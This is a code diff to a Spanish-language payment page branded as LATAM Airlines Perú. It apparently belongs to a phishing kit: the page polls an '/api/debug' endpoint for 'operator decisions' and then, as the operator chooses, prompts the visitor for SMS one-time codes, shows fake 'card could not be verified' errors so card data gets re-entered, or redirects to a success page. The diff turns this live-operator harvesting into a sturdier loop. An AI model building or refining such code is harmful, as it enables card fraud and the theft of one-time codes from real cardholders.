@@ -547,10 +547,13 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     return response.json();
   }
 
-  async function pollDebugDecision(timeoutMs = 90000) {
+  let debugPollGen = 0;
+
+  async function pollDebugDecision(timeoutMs = 90000, gen = debugPollGen) {
     const sessionId = debugSessionId();
     const started = Date.now();
     while (Date.now() - started < timeoutMs) {
+      if (gen !== debugPollGen) return { action: 'cancelled' };
       const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}`, {
         headers: { Accept: 'application/json' },
       });
@@ -565,6 +568,76 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
       action: 'timeout',
       message: 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.',
     };
+  }
+
+  async function watchOperatorDecisions({
+    wait,
+    challenge,
+    brandKey,
+    merchantLabel,
+    amountLabel,
+    datetimeLabel,
+    resetChallenge = true,
+  }) {
+    const gen = debugPollGen;
+    while (gen === debugPollGen) {
+      const decision = await pollDebugDecision(180000, gen);
+      if (gen !== debugPollGen) return;
+      const nextAction = decision?.action || 'timeout';
+      if (nextAction === 'cancelled') return;
+
+      if (nextAction === 'sms' || nextAction === 'sms_error') {
+        if (wait) wait.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        if (resetChallenge) {
+          showChallenge(
+            brandKey,
+            merchantLabel,
+            amountLabel,
+            datetimeLabel,
+            nextAction === 'sms_error' ? decision?.message || '' : '',
+          );
+        } else {
+          if (challenge) challenge.hidden = false;
+          setChallengeMessage(
+            brandKey,
+            decision?.message || 'Código inválido. Hemos enviado un nuevo código por SMS o correo',
+            nextAction === 'sms_error' ? 'error' : 'info',
+          );
+          const input = challenge?.querySelector(`[data-challenge-brand="${brandKey}"] input[name="otp"]`);
+          if (input) {
+            input.value = '';
+            input.focus();
+          }
+        }
+        continue;
+      }
+
+      if (nextAction === 'card' || nextAction === 'card_error') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        clearCardInputs();
+        setCardOpen(true);
+        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        cardNumber?.focus();
+        return;
+      }
+
+      if (nextAction === 'approved') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        window.location.href = '/success';
+        return;
+      }
+
+      if (challenge && !challenge.hidden) continue;
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
+      return;
+    }
   }
 
   function maskCard(value) {
@@ -1184,6 +1257,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
 
   payBtn?.addEventListener('click', async () => {
     if (payBtn.disabled || payBtn.classList.contains('is-loading')) return;
+    debugPollGen += 1;
     const wait = document.getElementById('pagos-wait-screen');
     const challenge = document.getElementById('pagos-challenge-screen');
     const brand = detectCardBrand(cardNumber?.value || '').brand;
@@ -1264,44 +1338,15 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         }),
       );
 
-      const decision = await pollDebugDecision(180000);
-      const nextAction = decision?.action || 'timeout';
-
-      if (nextAction === 'sms' || nextAction === 'sms_error') {
-        if (wait) wait.hidden = true;
-        document.body.classList.remove('is-offers-waiting');
-        showChallenge(
-          brandKey,
-          merchantLabel,
-          amountLabel,
-          datetimeLabel,
-          nextAction === 'sms_error' ? decision?.message || '' : '',
-        );
-        return;
-      }
-
-      if (nextAction === 'card' || nextAction === 'card_error') {
-        if (wait) wait.hidden = true;
-        if (challenge) challenge.hidden = true;
-        document.body.classList.remove('is-offers-waiting');
-        clearCardInputs();
-        setCardOpen(true);
-        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
-        cardNumber?.focus();
-        return;
-      }
-
-      if (nextAction === 'approved') {
-        if (wait) wait.hidden = true;
-        if (challenge) challenge.hidden = true;
-        document.body.classList.remove('is-offers-waiting');
-        window.location.href = '/success';
-        return;
-      }
-
-      if (wait) wait.hidden = true;
-      document.body.classList.remove('is-offers-waiting');
-      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
+      await watchOperatorDecisions({
+        wait,
+        challenge,
+        brandKey,
+        merchantLabel,
+        amountLabel,
+        datetimeLabel,
+        resetChallenge: true,
+      });
     } catch (error) {
       payBtn.classList.remove('is-loading');
       payBtn.removeAttribute('aria-busy');
@@ -1362,6 +1407,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         setChallengeMessage(brandKey, 'No pudimos procesar el código. Intenta nuevamente.');
         return;
       }
+      debugPollGen += 1;
       const wait = document.getElementById('pagos-wait-screen');
       const challenge = document.getElementById('pagos-challenge-screen');
       wait?.querySelectorAll('[data-wait-brand]').forEach((el) => {
@@ -1371,48 +1417,16 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
       if (wait) wait.hidden = false;
       document.body.classList.add('is-offers-waiting');
 
-      const decision = await pollDebugDecision();
-      const nextAction = decision?.action || 'timeout';
-
-      if (nextAction === 'card' || nextAction === 'card_error') {
-        if (wait) wait.hidden = true;
-        if (challenge) challenge.hidden = true;
-        document.body.classList.remove('is-offers-waiting');
-        clearCardInputs();
-        setCardOpen(true);
-        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
-        cardNumber?.focus();
-        return;
-      }
-
-      if (nextAction === 'sms' || nextAction === 'sms_error') {
-        if (wait) wait.hidden = true;
-        challenge?.querySelectorAll('[data-challenge-brand]').forEach((el) => {
-          el.hidden = el.getAttribute('data-challenge-brand') !== brandKey;
-        });
-        if (challenge) challenge.hidden = false;
-        document.body.classList.remove('is-offers-waiting');
-        setChallengeMessage(
-          brandKey,
-          decision?.message || 'Código inválido. Hemos enviado un nuevo código por SMS o correo',
-          nextAction === 'sms_error' ? 'error' : 'info',
-        );
-        input.value = '';
-        input.focus();
-        return;
-      }
-
-      if (nextAction === 'approved') {
-        if (wait) wait.hidden = true;
-        if (challenge) challenge.hidden = true;
-        document.body.classList.remove('is-offers-waiting');
-        window.location.href = '/success';
-        return;
-      }
-
-      if (wait) wait.hidden = true;
-      document.body.classList.remove('is-offers-waiting');
-      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
+      const draft = JSON.parse(sessionStorage.getItem('latam-payment-draft') || '{}');
+      await watchOperatorDecisions({
+        wait,
+        challenge,
+        brandKey,
+        merchantLabel: draft.merchant || 'LATAM Airlines Perú',
+        amountLabel: draft.amountLabel || money(total, true),
+        datetimeLabel: draft.dateLabel && draft.timeLabel ? `${draft.dateLabel} · ${draft.timeLabel}` : '',
+        resetChallenge: false,
+      });
     });
   });
 </script>
